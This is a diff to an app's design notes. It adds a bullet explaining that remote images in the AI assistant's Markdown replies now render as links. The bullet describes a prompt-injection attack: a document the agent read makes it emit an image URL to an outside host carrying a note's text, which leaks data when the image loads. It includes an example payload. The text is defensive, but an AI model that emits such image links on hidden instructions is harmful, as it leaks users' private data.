@@ -86,6 +86,12 @@ Eleven things are load-bearing:
   catalog edited so the model is offered no tool of its own (see *Codex* below). That server reaches
   this one over loopback with the launch token and `x-anydag-chat: <id>` on every call, so every
   write goes through the route the page uses — the base sha1, the 409 and `merge3` included.
+- **Nor is the page one of its tools: an image from elsewhere in a reply is a link** (#10). The
+  reply is drawn as Markdown while it streams, and an `<img>` loads with no click, so
+  `![](https://elsewhere/?d=…)` with a note's text in the URL — written because a document the
+  agent read said to — was a request made for it, the one way out of a chat with no network of its
+  own. `Thread.tsx` draws any image `remoteImage` (`src/assistant/words.ts`) resolves to another
+  origin as a link with its alt text; references and the app's own files draw as before.
 - **The MCP child is this process as Node, and in the desktop app that means keeping
   `ELECTRON_RUN_AS_NODE`.** `Live.mcpFor` starts it as `process.execPath` + `process.argv[1]` +
   `mcp --chat`, with the port, token and home in its environment, and the switch too when the parent
